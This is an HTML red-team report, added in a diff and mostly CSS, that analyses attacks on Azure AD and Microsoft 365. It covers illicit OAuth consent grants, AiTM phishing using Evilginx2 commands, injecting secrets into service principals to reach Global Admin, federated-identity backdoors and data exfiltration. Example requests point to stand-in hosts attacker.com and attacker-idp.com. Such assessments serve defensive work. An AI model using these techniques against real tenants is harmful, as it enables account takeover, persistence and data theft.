@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RED TEAM — Azure AD / M365 / OAuth Attack Analysis</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@300;400;500;600&family=Fira+Code:wght@400;500;600&family=Syne:wght@400;500;600;700;800&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-primary: #0a0a0f;
+  --bg-secondary: #0f1019;
+  --bg-card: #12131f;
+  --bg-elevated: #181a2a;
+  --border: #1e2035;
+  --border-glow: #2a2d4a;
+  --red-primary: #ff2d55;
+  --red-dim: #ff2d5540;
+  --red-glow: #ff2d5520;
+  --cyan: #00e5ff;
+  --cyan-dim: #00e5ff30;
+  --green: #00ff88;
+  --green-dim: #00ff8830;
+  --amber: #ffab00;
+  --amber-dim: #ffab0030;
+  --purple: #b388ff;
+  --purple-dim: #b388ff30;
+  --text-primary: #e8e8f0;
+  --text-secondary: #8888a0;
+  --text-dim: #555570;
+  --text-bright: #ffffff;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  font-family: 'Outfit', sans-serif;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Scanline overlay */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.03) 2px,
+    rgba(0,0,0,0.03) 4px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* Grid background */
+body::after {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background-image:
+    linear-gradient(rgba(30,32,53,0.3) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(30,32,53,0.3) 1px, transparent 1px);
+  background-size: 60px 60px;
+  pointer-events: none;
+  z-index: -1;
+}
+
+.container {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 0 40px;
+}
+
+/* ─── HERO ─── */
+.hero {
+  position: relative;
+  padding: 100px 0 80px;
+  overflow: hidden;
+}
+
+.hero::before {
+  content: '';
+  position: absolute;
+  top: -200px;
+  right: -200px;
+  width: 600px;
+  height: 600px;
+  background: radial-gradient(circle, var(--red-dim) 0%, transparent 70%);
+  animation: pulse-glow 4s ease-in-out infinite;
+}
+
+@keyframes pulse-glow {
+  0%, 100% { opacity: 0.4; transform: scale(1); }
+  50% { opacity: 0.7; transform: scale(1.1); }
+}
+
+.classification-bar {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  padding: 6px 16px;
+  background: var(--red-dim);
+  border: 1px solid var(--red-primary);
+  border-radius: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--red-primary);
+  margin-bottom: 30px;
+  animation: flicker 3s infinite;
+}
+
+@keyframes flicker {
+  0%, 95%, 100% { opacity: 1; }
+  96% { opacity: 0.8; }
+  97% { opacity: 1; }
+  98% { opacity: 0.7; }
+}
+
+.classification-bar .dot {
+  width: 6px; height: 6px;
+  background: var(--red-primary);
+  border-radius: 50%;
+  animation: blink 1.5s infinite;
+}
+
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+
+.hero h1 {
+  font-family: 'Syne', sans-serif;
+  font-size: 72px;
+  font-weight: 800;
+  line-height: 1.05;
+  letter-spacing: -2px;
+  color: var(--text-bright);
+  margin-bottom: 10px;
+}
+
+.hero h1 span {
+  background: linear-gradient(135deg, var(--red-primary), var(--cyan));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.hero-sub {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px;
+  color: var(--text-secondary);
+  margin-bottom: 40px;
+  letter-spacing: 1px;
+}
+
+.hero-meta {
+  display: flex;
+  gap: 30px;
+  flex-wrap: wrap;
+}
+
+.meta-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--text-dim);
+}
+
+.meta-item .label { color: var(--text-secondary); }
+.meta-item .value { color: var(--cyan); }
+
+/* ─── SECTION STYLING ─── */
+.section {
+  margin-bottom: 80px;
+  animation: fadeUp 0.6s ease-out both;
+}
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(30px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 36px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+.section-number {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--red-primary);
+  background: var(--red-glow);
+  border: 1px solid var(--red-dim);
+  padding: 4px 10px;
+  border-radius: 3px;
+  letter-spacing: 2px;
+}
+
+.section-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 28px;
+  font-weight: 700;
+  color: var(--text-bright);
+}
+
+/* ─── CARDS ─── */
+.card-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+  gap: 20px;
+}
+
+.card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 28px;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s ease;
+}
+
+.card:hover {
+  border-color: var(--border-glow);
+  transform: translateY(-2px);
+  box-shadow: 0 8px 40px rgba(0,0,0,0.4);
+}
+
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0;
+  width: 3px;
+  height: 100%;
+}
+
+.card.red::before { background: var(--red-primary); }
+.card.cyan::before { background: var(--cyan); }
+.card.green::before { background: var(--green); }
+.card.amber::before { background: var(--amber); }
+.card.purple::before { background: var(--purple); }
+
+.card-tag {
+  display: inline-block;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  padding: 3px 10px;
+  border-radius: 3px;
+  margin-bottom: 14px;
+}
+
+.card.red .card-tag { color: var(--red-primary); background: var(--red-glow); }
+.card.cyan .card-tag { color: var(--cyan); background: var(--cyan-dim); }
+.card.green .card-tag { color: var(--green); background: var(--green-dim); }
+.card.amber .card-tag { color: var(--amber); background: var(--amber-dim); }
+.card.purple .card-tag { color: var(--purple); background: var(--purple-dim); }
+
+.card h3 {
+  font-family: 'Outfit', sans-serif;
+  font-size: 18px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin-bottom: 12px;
+}
+
+.card p, .card li {
+  font-size: 14px;
+  color: var(--text-secondary);
+  line-height: 1.8;
+}
+
+.card ul {
+  list-style: none;
+  padding: 0;
+}
+
+.card ul li {
+  padding: 4px 0 4px 20px;
+  position: relative;
+}
+
+.card ul li::before {
+  content: '▸';
+  position: absolute;
+  left: 0;
+  color: var(--text-dim);
+}
+
+/* ─── ATTACK CHAIN ─── */
+.attack-chain {
+  position: relative;
+  padding: 20px 0;
+}
+
+.chain-step {
+  display: flex;
+  gap: 30px;
+  margin-bottom: 0;
+  position: relative;
+}
+
+.chain-line {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  min-width: 50px;
+}
+
+.chain-node {
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  font-weight: 700;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 2;
+}
+
+.chain-node.initial { background: var(--red-dim); color: var(--red-primary); border: 2px solid var(--red-primary); }
+.chain-node.execution { background: var(--amber-dim); color: var(--amber); border: 2px solid var(--amber); }
+.chain-node.persistence { background: var(--purple-dim); color: var(--purple); border: 2px solid var(--purple); }
+.chain-node.lateral { background: var(--cyan-dim); color: var(--cyan); border: 2px solid var(--cyan); }
+.chain-node.objective { background: var(--green-dim); color: var(--green); border: 2px solid var(--green); }
+
+.chain-connector {
+  width: 2px;
+  flex-grow: 1;
+  min-height: 30px;
+  background: linear-gradient(to bottom, var(--border-glow), var(--border));
+}
+
+.chain-content {
+  flex: 1;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 24px 28px;
+  margin-bottom: 16px;
+  transition: border-color 0.3s;
+}
+
+.chain-content:hover {
+  border-color: var(--border-glow);
+}
+
+.chain-phase {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+
+.chain-phase.ia { color: var(--red-primary); }
+.chain-phase.ex { color: var(--amber); }
+.chain-phase.pe { color: var(--purple); }
+.chain-phase.la { color: var(--cyan); }
+.chain-phase.ob { color: var(--green); }
+
+.chain-content h3 {
+  font-family: 'Outfit', sans-serif;
+  font-size: 17px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin-bottom: 10px;
+}
+
+.chain-content p {
+  font-size: 13.5px;
+  color: var(--text-secondary);
+  margin-bottom: 10px;
+}
+
+/* ─── CODE BLOCKS ─── */
+.code-block {
+  background: #080810;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 18px 22px;
+  margin: 14px 0;
+  overflow-x: auto;
+}
+
+.code-block code {
+  font-family: 'Fira Code', 'JetBrains Mono', monospace;
+  font-size: 12.5px;
+  line-height: 1.8;
+  color: var(--text-secondary);
+}
+
+.code-block .comment { color: var(--text-dim); }
+.code-block .cmd { color: var(--cyan); }
+.code-block .flag { color: var(--amber); }
+.code-block .string { color: var(--green); }
+.code-block .danger { color: var(--red-primary); }
+
+/* ─── MITRE TABLE ─── */
+.mitre-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13.5px;
+  margin: 10px 0;
+}
+
+.mitre-table thead th {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--text-dim);
+  padding: 12px 16px;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg-secondary);
+}
+
+.mitre-table tbody td {
+  padding: 14px 16px;
+  border-bottom: 1px solid var(--border);
+  color: var(--text-secondary);
+  vertical-align: top;
+}
+
+.mitre-table tbody tr:hover {
+  background: var(--bg-elevated);
+}
+
+.mitre-id {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  font-weight: 500;
+  color: var(--red-primary);
+  white-space: nowrap;
+}
+
+.severity {
+  display: inline-block;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  padding: 3px 10px;
+  border-radius: 3px;
+}
+
+.severity.critical { color: var(--red-primary); background: var(--red-glow); }
+.severity.high { color: var(--amber); background: var(--amber-dim); }
+.severity.medium { color: var(--purple); background: var(--purple-dim); }
+
+/* ─── ARTIFACTS SECTION ─── */
+.artifact-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+  gap: 20px;
+}
+
+.artifact-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+}
+
+.artifact-header {
+  padding: 18px 24px;
+  background: var(--bg-elevated);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.artifact-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 15px;
+}
+
+.artifact-icon.log { background: var(--cyan-dim); }
+.artifact-icon.token { background: var(--amber-dim); }
+.artifact-icon.reg { background: var(--purple-dim); }
+.artifact-icon.mail { background: var(--green-dim); }
+.artifact-icon.alert { background: var(--red-glow); }
+
+.artifact-header h4 {
+  font-family: 'Outfit', sans-serif;
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-bright);
+}
+
+.artifact-body {
+  padding: 20px 24px;
+}
+
+.artifact-body p {
+  font-size: 13px;
+  color: var(--text-secondary);
+  margin-bottom: 10px;
+}
+
+.artifact-path {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--cyan);
+  background: rgba(0,229,255,0.06);
+  padding: 6px 12px;
+  border-radius: 4px;
+  display: block;
+  margin-top: 8px;
+  word-break: break-all;
+}
+
+/* ─── DEFENSE RECOMMENDATIONS ─── */
+.defense-item {
+  display: flex;
+  gap: 20px;
+  padding: 22px 0;
+  border-bottom: 1px solid var(--border);
+}
+
+.defense-item:last-child { border-bottom: none; }
+
+.defense-priority {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  padding: 4px 10px;
+  border-radius: 3px;
+  height: fit-content;
+  white-space: nowrap;
+}
+
+.defense-priority.p1 { color: var(--red-primary); background: var(--red-glow); border: 1px solid var(--red-dim); }
+.defense-priority.p2 { color: var(--amber); background: var(--amber-dim); border: 1px solid rgba(255,171,0,0.2); }
+.defense-priority.p3 { color: var(--cyan); background: var(--cyan-dim); border: 1px solid rgba(0,229,255,0.2); }
+
+.defense-content h4 {
+  font-family: 'Outfit', sans-serif;
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin-bottom: 6px;
+}
+
+.defense-content p {
+  font-size: 13.5px;
+  color: var(--text-secondary);
+}
+
+/* ─── FOOTER ─── */
+.report-footer {
+  padding: 40px 0;
+  border-top: 1px solid var(--border);
+  margin-top: 60px;
+  text-align: center;
+}
+
+.report-footer p {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text-dim);
+  letter-spacing: 1px;
+}
+
+/* ─── RESPONSIVE ─── */
+@media (max-width: 768px) {
+  .container { padding: 0 20px; }
+  .hero h1 { font-size: 40px; }
+  .card-grid { grid-template-columns: 1fr; }
+  .chain-step { flex-direction: column; gap: 0; }
+  .chain-line { flex-direction: row; min-width: auto; margin-bottom: 10px; }
+  .chain-connector { width: auto; height: 2px; min-height: auto; min-width: 20px; }
+  .artifact-grid { grid-template-columns: 1fr; }
+  .mitre-table { font-size: 12px; }
+  .hero-meta { flex-direction: column; gap: 10px; }
+}
+
+/* ─── ANIMATIONS ─── */
+.section:nth-child(2) { animation-delay: 0.1s; }
+.section:nth-child(3) { animation-delay: 0.2s; }
+.section:nth-child(4) { animation-delay: 0.3s; }
+.section:nth-child(5) { animation-delay: 0.4s; }
+.section:nth-child(6) { animation-delay: 0.5s; }
+.section:nth-child(7) { animation-delay: 0.6s; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<!-- ═══════════════ HERO ═══════════════ -->
+<header class="hero">
+  <div class="classification-bar">
+    <span class="dot"></span>
+    CONFIDENTIAL — RED TEAM ASSESSMENT
+  </div>
+  <h1>Azure AD / M365<br><span>Attack Surface Analysis</span></h1>
+  <p class="hero-sub">OAuth Abuse · Cloud Persistence · Lateral Movement in SaaS Environments</p>
+  <div class="hero-meta">
+    <div class="meta-item"><span class="label">TARGET:</span><span class="value">Azure AD + M365 + 3rd-Party OAuth</span></div>
+    <div class="meta-item"><span class="label">DATE:</span><span class="value">2026-02-07</span></div>
+    <div class="meta-item"><span class="label">FRAMEWORK:</span><span class="value">MITRE ATT&CK Cloud</span></div>
+    <div class="meta-item"><span class="label">RISK:</span><span class="value" style="color:var(--red-primary)">CRITICAL</span></div>
+  </div>
+</header>
+
+<!-- ═══════════════ Q1: MISCONFIGURATIONS ═══════════════ -->
+<section class="section">
+  <div class="section-header">
+    <span class="section-number">01</span>
+    <h2 class="section-title">Priority Misconfigurations to Hunt</h2>
+  </div>
+
+  <div class="card-grid">
+    <div class="card red">
+      <span class="card-tag">CRITICAL — IDENTITY</span>
+      <h3>Azure AD Conditional Access Gaps</h3>
+      <ul>
+        <li>Policies that exclude legacy authentication protocols (IMAP, SMTP, POP3) — these bypass MFA entirely</li>
+        <li>Missing Conditional Access for "All Cloud Apps" — admins often protect M365 but forget third-party SaaS</li>
+        <li>Break-glass accounts without monitoring or with weak/absent MFA</li>
+        <li>Named locations that are overly broad — trusting entire CIDR ranges from cloud providers</li>
+      </ul>
+    </div>
+
+    <div class="card cyan">
+      <span class="card-tag">CRITICAL — OAUTH / CONSENT</span>
+      <h3>Overpermissive App Registrations & Consent</h3>
+      <ul>
+        <li>User consent enabled for all apps (default) — enables illicit consent grant attacks</li>
+        <li>App registrations with <code>Mail.ReadWrite</code>, <code>Files.ReadWrite.All</code>, or <code>Directory.ReadWrite.All</code></li>
+        <li>Multi-tenant applications with excessive delegated permissions</li>
+        <li>Stale app registrations with credentials that haven't been rotated</li>
+      </ul>
+    </div>
+
+    <div class="card amber">
+      <span class="card-tag">HIGH — PRIVILEGE</span>
+      <h3>Privileged Role Misconfigurations</h3>
+      <ul>
+        <li>Permanent Global Admin assignments (no PIM activation required)</li>
+        <li>Custom roles with hidden dangerous permissions like <code>microsoft.directory/servicePrincipals/credentials/update</code></li>
+        <li>Application Administrators who can add credentials to any service principal</li>
+        <li>Users with both Azure AD and Azure Resource Manager privilege (cross-plane escalation)</li>
+      </ul>
+    </div>
+
+    <div class="card purple">
+      <span class="card-tag">HIGH — M365</span>
+      <h3>M365 Tenant Misconfigurations</h3>
+      <ul>
+        <li>Exchange Online: mail forwarding rules not restricted, transport rules allowing external auto-forward</li>
+        <li>SharePoint/OneDrive: external sharing set to "Anyone" with anonymous links</li>
+        <li>Teams: guest access unrestricted, external domain federation wide open</li>
+        <li>Audit logging not enabled for Unified Audit Log or sign-in logs not routed to SIEM</li>
+      </ul>
+    </div>
+
+    <div class="card green">
+      <span class="card-tag">MEDIUM — INFRASTRUCTURE</span>
+      <h3>Hybrid & Sync Weaknesses</h3>
+      <ul>
+        <li>Azure AD Connect server running as Domain Admin with password hash sync</li>
+        <li>Seamless SSO computer account (<code>AZUREADSSOACC</code>) with unchanged Kerberos key</li>
+        <li>Pass-Through Authentication agents running on under-monitored servers</li>
+        <li>On-prem AD object writeback enabling cloud-to-ground privilege escalation</li>
+      </ul>
+    </div>
+
+    <div class="card red">
+      <span class="card-tag">CRITICAL — SECRETS</span>
+      <h3>Credential & Secret Exposure</h3>
+      <ul>
+        <li>Service principal secrets / certificates in code repos, pipelines, or Key Vault with broad access policies</li>
+        <li>Managed Identity tokens accessible from compromised Azure resources (IMDS endpoint)</li>
+        <li>Token lifetime policies allowing long-lived refresh tokens (default 90 days)</li>
+        <li>FIDO2 / Windows Hello not enforced — phishing-susceptible MFA methods in use</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ Q2: OAUTH PERSISTENCE ═══════════════ -->
+<section class="section">
+  <div class="section-header">
+    <span class="section-number">02</span>
+    <h2 class="section-title">OAuth Abuse for Persistence</h2>
+  </div>
+
+  <div class="card-grid">
+    <div class="card cyan">
+      <span class="card-tag">TECHNIQUE</span>
+      <h3>Illicit Consent Grant (T1098.003)</h3>
+      <p>Trick a user (or compromised admin) into granting OAuth permissions to an attacker-controlled application. Once consent is granted, the app receives tokens independently of the user's session — surviving password resets, MFA enrollment changes, and even session revocation.</p>
+      <div class="code-block"><code>
+<span class="comment"># Attacker-crafted consent URL</span><br>
+<span class="cmd">https://login.microsoftonline.com/common/oauth2/v2.0/authorize</span><br>
+  <span class="flag">?client_id=</span><span class="danger">{attacker_app_id}</span><br>
+  <span class="flag">&response_type=</span><span class="string">code</span><br>
+  <span class="flag">&redirect_uri=</span><span class="danger">https://attacker.com/callback</span><br>
+  <span class="flag">&scope=</span><span class="danger">Mail.Read Files.ReadWrite.All offline_access</span><br>
+  <span class="flag">&state=</span><span class="string">random_state_value</span>
+      </code></div>
+    </div>
+
+    <div class="card purple">
+      <span class="card-tag">TECHNIQUE</span>
+      <h3>Backdoor App Registration Credentials</h3>
+      <p>If an attacker gains Application Admin or Owner rights on an existing high-privilege app registration, they add a new client secret or certificate. This provides a persistent, independent authentication path that generates tokens scoped to the app's permissions — completely decoupled from any user identity.</p>
+      <div class="code-block"><code>
+<span class="comment"># Add new secret to existing app via Microsoft Graph</span><br>
+<span class="cmd">POST</span> <span class="string">https://graph.microsoft.com/v1.0/applications/{id}/addPassword</span><br>
+{<br>
+&nbsp;&nbsp;<span class="flag">"passwordCredential"</span>: {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="flag">"displayName"</span>: <span class="string">"Backup Automation Key"</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="flag">"endDateTime"</span>: <span class="string">"2028-12-31T00:00:00Z"</span><br>
+&nbsp;&nbsp;}<br>
+}
+      </code></div>
+    </div>
+
+    <div class="card amber">
+      <span class="card-tag">TECHNIQUE</span>
+      <h3>Refresh Token Harvesting & Replay</h3>
+      <p>OAuth refresh tokens for "offline_access" scoped apps persist for up to 90 days by default. An attacker who exfiltrates a refresh token can continuously obtain new access tokens from any IP, without re-authenticating. This survives password changes unless the refresh token is explicitly revoked.</p>
+      <div class="code-block"><code>
+<span class="comment"># Exchange stolen refresh token for new access token</span><br>
+<span class="cmd">POST</span> <span class="string">https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token</span><br>
+<span class="flag">grant_type=</span><span class="string">refresh_token</span><br>
+<span class="flag">&refresh_token=</span><span class="danger">{stolen_refresh_token}</span><br>
+<span class="flag">&client_id=</span><span class="danger">{app_id}</span><br>
+<span class="flag">&scope=</span><span class="string">https://graph.microsoft.com/.default</span>
+      </code></div>
+    </div>
+
+    <div class="card red">
+      <span class="card-tag">TECHNIQUE</span>
+      <h3>Service Principal Abuse & Federated Identity</h3>
+      <p>Adding a federated identity credential to a service principal allows an external identity provider (attacker-controlled) to authenticate as that service principal. No shared secret required — the attacker's IdP issues signed tokens that Azure AD trusts. Extremely stealthy and hard to detect.</p>
+      <div class="code-block"><code>
+<span class="comment"># Add federated credential to service principal</span><br>
+<span class="cmd">POST</span> <span class="string">https://graph.microsoft.com/v1.0/applications/{id}/federatedIdentityCredentials</span><br>
+{<br>
+&nbsp;&nbsp;<span class="flag">"name"</span>: <span class="string">"github-deploy"</span>,<br>
+&nbsp;&nbsp;<span class="flag">"issuer"</span>: <span class="danger">"https://attacker-idp.com"</span>,<br>
+&nbsp;&nbsp;<span class="flag">"subject"</span>: <span class="danger">"attacker-controlled-subject"</span>,<br>
+&nbsp;&nbsp;<span class="flag">"audiences"</span>: [<span class="string">"api://AzureADTokenExchange"</span>]<br>
+}
+      </code></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ ATTACK CHAIN ═══════════════ -->
+<section class="section">
+  <div class="section-header">
+    <span class="section-number">03</span>
+    <h2 class="section-title">Full Attack Chain — Cloud-Native Kill Chain</h2>
+  </div>
+
+  <div class="attack-chain">
+
+    <!-- Step 1 -->
+    <div class="chain-step">
+      <div class="chain-line">
+        <div class="chain-node initial">01</div>
+        <div class="chain-connector"></div>
+      </div>
+      <div class="chain-content">
+        <div class="chain-phase ia">INITIAL ACCESS</div>
+        <h3>Adversary-in-the-Middle Phishing (AiTM)</h3>
+        <p>Deploy a reverse-proxy phishing toolkit (e.g., Evilginx2, EvilProxy) targeting the M365 login page. The proxy transparently relays credentials <strong>and</strong> session cookies, defeating SMS/TOTP-based MFA. The attacker obtains a fully authenticated session token.</p>
+        <div class="code-block"><code>
+<span class="comment"># Evilginx2 phishlet targets M365 session cookie</span><br>
+<span class="comment"># Captured artifact: ESTSAUTH / ESTSAUTHPERSISTENT cookies</span><br>
+<span class="comment"># These cookies can be imported into a browser to hijack the session</span><br>
+<span class="cmd">: phishlets enable</span> <span class="string">o365</span><br>
+<span class="cmd">: lures create</span> <span class="string">o365</span><br>
+<span class="cmd">: lures get-url</span> <span class="string">0</span>
+        </code></div>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="chain-step">
+      <div class="chain-line">
+        <div class="chain-node execution">02</div>
+        <div class="chain-connector"></div>
+      </div>
+      <div class="chain-content">
+        <div class="chain-phase ex">RECONNAISSANCE & EXECUTION</div>
+        <h3>Enumerate Tenant via Microsoft Graph</h3>
+        <p>Using the hijacked session, query Microsoft Graph to enumerate users, groups, roles, app registrations, service principals, Conditional Access policies, and mail transport rules. Identify high-value targets and escalation paths.</p>
+        <div class="code-block"><code>
+<span class="comment"># Enumerate high-privilege role members</span><br>
+<span class="cmd">GET</span> <span class="string">https://graph.microsoft.com/v1.0/directoryRoles</span><br>
+<span class="cmd">GET</span> <span class="string">https://graph.microsoft.com/v1.0/directoryRoles/{id}/members</span><br><br>
+<span class="comment"># Enumerate all OAuth app registrations and their permissions</span><br>
+<span class="cmd">GET</span> <span class="string">https://graph.microsoft.com/v1.0/applications?$select=displayName,appId,requiredResourceAccess</span><br><br>
+<span class="comment"># Enumerate Conditional Access policies (requires privilege)</span><br>
+<span class="cmd">GET</span> <span class="string">https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies</span>
+        </code></div>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="chain-step">
+      <div class="chain-line">
+        <div class="chain-node execution">03</div>
+        <div class="chain-connector"></div>
+      </div>
+      <div class="chain-content">
+        <div class="chain-phase ex">PRIVILEGE ESCALATION</div>
+        <h3>Abuse Application Admin → Service Principal Credential Injection</h3>
+        <p>The compromised user has Application Administrator role (common for IT staff). Use this to add a new client secret to a service principal that already holds <code>RoleManagement.ReadWrite.Directory</code> or <code>AppRoleAssignment.ReadWrite.All</code>. Authenticate as this service principal and assign Global Admin to an attacker-controlled account.</p>
+        <div class="code-block"><code>
+<span class="comment"># Step 1: Inject credential into high-privilege SP</span><br>
+<span class="cmd">POST</span> <span class="string">/applications/{target-app-id}/addPassword</span><br><br>
+<span class="comment"># Step 2: Authenticate as the SP using client_credentials flow</span><br>
+<span class="cmd">POST</span> <span class="string">/oauth2/v2.0/token</span><br>
+<span class="flag">grant_type=</span><span class="string">client_credentials</span><br>
+<span class="flag">&client_id=</span><span class="danger">{sp_app_id}</span><br>
+<span class="flag">&client_secret=</span><span class="danger">{injected_secret}</span><br><br>
+<span class="comment"># Step 3: Assign Global Admin via the SP's permissions</span><br>
+<span class="cmd">POST</span> <span class="string">/directoryRoles/{global-admin-role-id}/members/$ref</span>
+        </code></div>
+      </div>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="chain-step">
+      <div class="chain-line">
+        <div class="chain-node persistence">04</div>
+        <div class="chain-connector"></div>
+      </div>
+      <div class="chain-content">
+        <div class="chain-phase pe">PERSISTENCE</div>
+        <h3>Multi-Layer Backdoor Installation</h3>
+        <p>Install overlapping persistence mechanisms: (1) Register a new multi-tenant OAuth app with delegated Mail.ReadWrite + offline_access, consent it under a compromised admin, (2) Add a federated identity credential to an existing service principal pointing to attacker IdP, (3) Create an inbox rule forwarding sensitive emails to an external address, (4) Deploy a malicious Azure Automation runbook with Managed Identity access.</p>
+      </div>
+    </div>
+
+    <!-- Step 5 -->
+    <div class="chain-step">
+      <div class="chain-line">
+        <div class="chain-node lateral">05</div>
+        <div class="chain-connector"></div>
+      </div>
+      <div class="chain-content">
+        <div class="chain-phase la">LATERAL MOVEMENT</div>
+        <h3>Cross-Tenant & Third-Party SaaS Pivot</h3>
+        <p>Abuse OAuth tokens to access third-party SaaS applications that trust Azure AD as an IdP. If the organization uses SAML/OIDC federation to apps like Salesforce, Slack, or AWS, forge SAML tokens (Golden SAML) or use the compromised Azure AD to generate legitimate SSO tokens into these services. Pivot through shared service accounts in connected SaaS platforms.</p>
+      </div>
+    </div>
+
+    <!-- Step 6 -->
+    <div class="chain-step">
+      <div class="chain-line">
+        <div class="chain-node objective">06</div>
+      </div>
+      <div class="chain-content">
+        <div class="chain-phase ob">OBJECTIVE</div>
+        <h3>Data Exfiltration & Impact</h3>
+        <p>Use Graph API to silently exfiltrate SharePoint document libraries, OneDrive contents, and Exchange mailboxes via application permissions. Alternatively, use eDiscovery compliance search (if Compliance Admin obtained) to search and export across all mailboxes. Deploy ransomware via Intune if MDM is in scope, or manipulate SharePoint/Teams data for business disruption.</p>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════ MITRE MAPPING ═══════════════ -->
+<section class="section">
+  <div class="section-header">
+    <span class="section-number">04</span>
+    <h2 class="section-title">MITRE ATT&CK Mapping</h2>
+  </div>
+
+  <div style="overflow-x: auto;">
+    <table class="mitre-table">
+      <thead>
+        <tr>
+          <th>Technique ID</th>
+          <th>Name</th>
+          <th>Phase</th>
+          <th>Risk</th>
+          <th>Notes</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="mitre-id">T1566.002</span></td>
+          <td>Spearphishing Link (AiTM)</td>
+          <td>Initial Access</td>
+          <td><span class="severity critical">CRITICAL</span></td>
+          <td>Reverse-proxy phishing bypasses non-phishing-resistant MFA</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1528</span></td>
+          <td>Steal Application Access Token</td>
+          <td>Credential Access</td>
+          <td><span class="severity critical">CRITICAL</span></td>
+          <td>Session token theft via AiTM proxy intercept</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1098.003</span></td>
+          <td>Additional Cloud Credentials</td>
+          <td>Persistence</td>
+          <td><span class="severity critical">CRITICAL</span></td>
+          <td>App credential injection + federated identity backdoors</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1098.002</span></td>
+          <td>Additional Email Delegate Permissions</td>
+          <td>Persistence</td>
